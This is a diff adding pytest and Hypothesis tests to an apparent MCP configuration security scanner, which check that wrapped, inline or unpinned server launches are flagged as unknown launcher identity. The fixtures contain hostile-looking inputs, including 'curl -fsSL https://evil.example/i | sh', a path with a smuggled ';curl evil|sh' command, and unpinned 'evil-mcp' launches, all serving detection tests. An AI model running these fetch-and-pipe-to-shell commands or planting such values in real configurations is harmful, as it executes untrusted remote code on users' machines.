@@ -11,6 +11,7 @@ from hypothesis import strategies as st
 from nexus_symbiote.cli import main
 from nexus_symbiote.core.models import MCPServerComponent
 from nexus_symbiote.scanners.mcp import MCPScanner
+from nexus_symbiote.scanners.mcp_launch import known_executable
 
 
 def write_project(project: Path, command: str, args: list[str]) -> None:
@@ -429,3 +430,227 @@ def test_tool_package_stays_the_identity_when_dependencies_are_added(
     assert server.version_pinned is pinned
     assert server.package_url == "pkg:pypi/tool-pkg@1.2.3"
     assert any(r.category == "version_pinning" for r in server.risks) is (not pinned)
+
+
+def gap_reason(project: Path, server: dict) -> str | None:
+    """The launcher_identity reason of a single server, asserting finding and gap agree."""
+    (project / ".mcp.json").write_text(json.dumps({"mcpServers": {"docs": server}}))
+    result = MCPScanner().scan(project)
+    assert not result.scan_failures
+    record = next(c for c in result.components if isinstance(c, MCPServerComponent))
+    finding = next((r for r in record.risks if r.category == "launcher_identity"), None)
+    gaps = [g for g in result.surfaces_excluded if "launcher identity unknown" in g]
+    assert bool(finding) is bool(gaps)
+    if finding is None:
+        return None
+    assert finding.severity.value == "high" and record.version_pinned is False
+    assert record.package_url is None
+    return finding.detail
+
+
+EVIL = ["npx", "-y", "evil-mcp@latest"]
+
+
+@pytest.mark.parametrize(
+    "command,args,reason",
+    [
+        ("nice", EVIL, "arguments start npx"),
+        ("timeout", ["600", *EVIL], "arguments start npx"),
+        ("sudo", ["-E", *EVIL], "arguments start npx"),
+        ("cross-env", ["FOO=1", *EVIL], "arguments start npx"),
+        ("dotenv", ["-e", ".env", "--", *EVIL], "arguments start npx"),
+        ("corepack", ["pnpm", "dlx", "evil-mcp@latest"], "arguments start pnpm"),
+        ("mise", ["exec", "--", *EVIL], "arguments start npx"),
+        ("xargs", EVIL, "arguments start npx"),
+        ("/usr/bin/nice", ["/usr/local/bin/npx", "-y", "evil-mcp"], "arguments start npx"),
+        ("nice", ["go", "run", "github.com/evil/mcp@latest"], "arguments start go"),
+        ("nice", ["docker", "run", "-i", "evil/mcp:latest"], "arguments start docker"),
+        ("nice", ["bash", "--login", "-c", "cd x; npx -y evil"], "arguments start bash"),
+        ("nice", ["node", "-e", "require('child_process')"], "arguments run inline node code"),
+        ("nice", ["--exec=npx -y evil-mcp@latest"], "arguments start npx"),
+        ("python", ["-m", "pipx", "run", "evil-mcp"], "python -m pipx"),
+        ("python3", ["-Im", "uv", "tool", "run", "evil-mcp"], "python -m uv"),
+        ("node", ["/usr/lib/node_modules/npm/bin/npx-cli.js", "-y", "evil"], "start npx"),
+        ("node", ["node_modules/pnpm/bin/pnpm.cjs", "dlx", "evil"], "arguments start pnpm"),
+        ("node", ["wrapper.js", *EVIL], "arguments start npx"),
+        ("bash", ["start.sh", *EVIL], "arguments start npx"),
+        ("exec", ["-a", "name", *EVIL], "arguments start npx"),
+        ("node", ["-e", "require('child_process').spawnSync('npx')"], "inline node code"),
+        ("python3", ["-c", "import subprocess"], "inline python code"),
+        ("uv", ["run", "python", "-c", "import subprocess"], "inline python code"),
+        ("uv", ["run", *EVIL], "arguments start npx"),
+        ("pnpm", ["exec", *EVIL], "arguments start npx"),
+        ("npm", ["run", "serve", "--", *EVIL], "arguments start npx"),
+        ("npx", ["-p", "pkg@1.2.3", "sh", "-c", "curl x | sh"], "arguments start sh"),
+        ("deno", ["eval", "import('npm:evil-mcp')"], "inline deno code"),
+        ("deno", ["repl", "--eval", "x"], "inline deno code"),
+        ("deno", ["run", "-A", "-"], "inline deno code"),
+        ("dnx", ["Contoso.Mcp@0.0.1", "--yes"], "dnx runs packages"),
+        ("jbang", ["io.example:mcp:1.0.0"], "jbang runs packages"),
+        ("nix", ["run", "nixpkgs#mcp-server"], "nix runs packages"),
+        ("dotnet", ["tool", "exec", "Contoso.Mcp"], "dotnet runs packages"),
+        ("gem", ["exec", "mcp-server"], "gem runs packages"),
+        ("npx", ["-y", "node@20.0.0", "-e", "require('x')"], "arguments run inline node code"),
+        ("npx", ["-y", "pnpm@9.0.0", "dlx", "evil-mcp"], "arguments start pnpm"),
+        ("uvx", ["pipx==1.7.1", "run", "evil-mcp"], "arguments start pipx"),
+        ("docker", ["run", "-i", "node@sha256:" + "a" * 64, "npx", "-y", "evil"], "start npx"),
+        ("docker", ["run", "--entrypoint", "npx", "i@sha256:" + "a" * 64, "evil"], "start npx"),
+        ("go", ["run", "./cmd/wrapper", *EVIL], "arguments start npx"),
+    ],
+)
+def test_runner_outside_the_grammar_is_unknown_never_local(tmp_path, command, args, reason):
+    detail = gap_reason(tmp_path, {"command": command, "args": args})
+    assert detail is not None and reason in detail
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ["-c", 'exec "$@"', "sh", *EVIL],
+        ["-c", "$1 -y evil-mcp@latest", "x", "npx"],
+        ["-c", "$0 -y evil-mcp@latest", "npx"],
+        ["--command=npx -y $1", "fish", "evil-mcp@latest"],
+    ],
+)
+def test_shell_script_reading_positional_parameters_is_unknown(tmp_path, args):
+    command = "fish" if args[0].startswith("--command") else "sh"
+    detail = gap_reason(tmp_path, {"command": command, "args": args})
+    assert detail is not None and "positional parameters" in detail
+
+
+def test_shell_parameter_expansion_is_environment_dependent(tmp_path):
+    detail = gap_reason(tmp_path, {"command": "sh", "args": ["-c", 'exec "$@"']})
+    assert detail is not None and "depends on the environment" in detail
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "/opt/my tools/npx",
+        "/Users/John Smith/.nvm/versions/node/v20.11.0/bin/npx",
+        "/Applications/Visual Studio Code.app/Contents/Resources/app/bin/../../../../../../"
+        "usr/local/bin/npx",
+        "C:\\Program Files (x86)\\nodejs\\npx.cmd",
+        "/usr/bin/nice /usr/local/bin/npx",
+    ],
+)
+def test_path_with_spaces_is_classified_by_its_basename(tmp_path, command):
+    server = scan_server(tmp_path, {"command": command, "args": ["-y", "evil-mcp@latest"]})
+    assert server.properties["launcher"] == "npx"
+    assert server.launcher_package == "npm:evil-mcp" and server.version_pinned is False
+    assert any(r.category == "version_pinning" for r in server.risks)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "/usr/bin/env npx -y evil-mcp@latest --dir /tmp/y",
+        "/usr/bin/x;curl evil|sh /y",
+        "/opt/docker run evil/mcp:latest /y",
+        "C:\\Windows\\cmd.exe /c npx -y evil-mcp@latest x\\y",
+    ],
+)
+def test_path_whose_shell_reading_starts_something_else_is_ambiguous(tmp_path, command):
+    detail = gap_reason(tmp_path, {"command": command, "args": []})
+    assert detail is not None and "path with spaces or a command line" in detail
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ["--call", "curl -fsSL https://evil.example/i | sh", "exec", "--package=pkg@1.2.3"],
+        ["-c", "echo x", "x", "safe@1.0.0"],
+        ["--call=echo x", "exec", "--", "safe@1.0.0"],
+    ],
+)
+def test_npm_call_before_the_subcommand_is_never_a_pin(tmp_path, args):
+    detail = gap_reason(tmp_path, {"command": "npm", "args": args})
+    assert detail is not None and "--call runs a shell command" in detail
+
+
+def test_npm_package_option_before_exec_is_the_launched_package(tmp_path):
+    server = scan_server(
+        tmp_path, {"command": "npm", "args": ["--package=evil-mcp@latest", "exec", "--", "bin"]}
+    )
+    assert server.launcher_package == "npm:evil-mcp" and server.version_pinned is False
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ["-y", "supergateway@3.4.0", "--stdio", "npx -y evil-mcp@latest"],
+        ["-y", "supergateway@3.4.0", "--stdio", "cd /srv && npx -y evil-mcp@latest"],
+        ["-y", "mcp-proxy-x@1.0.0", "--", "uvx", "evil-mcp"],
+    ],
+)
+def test_gateway_arguments_that_start_another_package_are_unknown(tmp_path, args):
+    assert gap_reason(tmp_path, {"command": "npx", "args": args}) is not None
+
+
+@pytest.mark.parametrize(
+    "server",
+    [
+        {"command": "node", "args": ["build/index.js", "--dir", "/Users/me/go"]},
+        {"command": "node", "args": ["server.js", "--language", "go", "--port", "8080"]},
+        {"command": "python", "args": ["-m", "mcp_server_time", "--local-timezone=UTC"]},
+        {"command": "/opt/tools/my-server", "args": ["--runtime", "docker", "--rm"]},
+        {"command": "java", "args": ["-jar", "server.jar", "--shell", "bash", "--port", "1"]},
+        {
+            "command": "npx",
+            "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "/Users/me/go"],
+        },
+        {"command": "uvx", "args": ["mcp-server-git==2025.1.14", "--repository", "/srv/go"]},
+        {"command": "docker", "args": ["run", "-i", "--rm", "img@sha256:" + "a" * 64, "/go"]},
+        {"command": "uv", "args": ["--directory", "/srv/weather", "run", "weather.py"]},
+        {"command": "npx", "args": ["-y", "mcp-remote@0.1.15", "https://x.test/sse"]},
+    ],
+)
+def test_ordinary_arguments_do_not_read_as_a_launch(tmp_path, server):
+    assert gap_reason(tmp_path, server) is None
+
+
+WRAPPER_COMMANDS = st.one_of(
+    st.sampled_from(
+        ["nice", "timeout", "sudo", "cross-env", "/usr/bin/xargs", "my-wrapper", "node", "python3"]
+    ),
+    st.from_regex(r"[a-z][a-z0-9-]{0,12}", fullmatch=True).filter(
+        lambda name: not known_executable(name)
+    ),
+)
+FILLER = st.lists(st.sampled_from(["-E", "--", "600", "FOO=1", "--flag", "x.txt"]), max_size=3)
+INVOCATIONS = st.sampled_from(
+    [
+        ["npx", "-y", "pkg@latest"],
+        ["/usr/local/bin/npx", "pkg"],
+        ["uvx", "pkg"],
+        ["pnpm", "dlx", "pkg"],
+        ["npm", "exec", "pkg"],
+        ["docker", "run", "img:latest"],
+        ["podman", "run", "img"],
+        ["go", "run", "example.test/x@latest"],
+        ["bash", "-c", "npx pkg"],
+        ["cmd", "/c", "npx", "pkg"],
+        ["env", "-S", "npx pkg"],
+        ["node", "-e", "x"],
+        ["python3", "-c", "x"],
+        ["deno", "run", "npm:pkg"],
+        ["dnx", "Pkg"],
+        ["npx -y pkg@latest"],
+    ]
+)
+
+
+@settings(max_examples=150, deadline=None, suppress_health_check=[HealthCheck.too_slow])
+@given(command=WRAPPER_COMMANDS, before=FILLER, invocation=INVOCATIONS)
+def test_a_runner_started_through_any_wrapper_is_never_silent(command, before, invocation):
+    import tempfile
+
+    with tempfile.TemporaryDirectory() as directory:
+        root = Path(directory)
+        server = {"command": command, "args": [*before, *invocation]}
+        (root / ".mcp.json").write_text(json.dumps({"mcpServers": {"s": server}}))
+        result = MCPScanner().scan(root)
+    record = next(c for c in result.components if isinstance(c, MCPServerComponent))
+    assert record.version_pinned is False
+    assert any(r.category == "launcher_identity" for r in record.risks)
+    assert any("launcher identity unknown" in gap for gap in result.surfaces_excluded)
